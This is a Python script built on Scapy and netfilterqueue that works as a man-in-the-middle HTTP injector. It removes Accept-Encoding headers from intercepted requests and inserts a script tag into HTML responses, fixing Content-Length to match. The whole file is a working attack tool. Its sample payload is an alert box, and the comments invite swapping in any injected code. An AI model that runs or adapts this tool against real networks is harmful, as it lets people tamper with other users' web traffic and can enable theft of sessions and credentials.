from scapy.all import *
from colorama import init, Fore
import netfilterqueue
import re

# Initialize colorama
init()

# Define colors
GREEN = Fore.GREEN
RESET = Fore.RESET

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # Convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())
    
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # Raw data cannot be decoded, apparently not HTML
                # Forward the packet and exit the function
                packet.accept()
                return
            
            # Remove Accept-Encoding header from the HTTP request
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            
            # Set the new data
            spacket[Raw].load = new_load
            
            # Set IP length header, checksums of IP and TCP to None
            # so Scapy will recalculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            
            # Set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))

        if spacket[TCP].sport == 80:
            # HTTP response
            print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except:
                packet.accept()
                return
            
            # Inject JavaScript code or HTML (you can choose what to inject)
            added_text = "<script>alert('Javascript Injected successfully!');</script>"
            # Alternatively, inject HTML instead:
            # added_text = "<p><b>HTML Injected successfully!</b></p>"
            
            # Calculate the length in bytes (each character corresponds to a byte)
            added_text_length = len(added_text)
            
            # Replace the </body> tag with the added text plus </body>
            load = load.replace("</body>", added_text + "</body>")
            
            if "Content-Length" in load:
                # If Content-Length header is available
                # Get the old Content-Length value
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                
                # Recalculate the content length by adding the length of the injected code
                new_content_length = content_length + added_text_length
                
                # Replace the new content length in the header
                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                
                # Print a message if the injection was successful
                if added_text in load:
                    print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
            
            # Set the new data
            spacket[Raw].load = load
            
            # Set IP length header, checksums of IP and TCP to None
            # so Scapy will recalculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            
            # Set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
    
    # Accept all the packets
    packet.accept()

if __name__ == "__main__":
    # Initialize the queue
    queue = netfilterqueue.NetfilterQueue()
    
    # Bind the queue number 0 to the process_packet() function
    queue.bind(0, process_packet)
    
    # Start the filter queue
    queue.run()
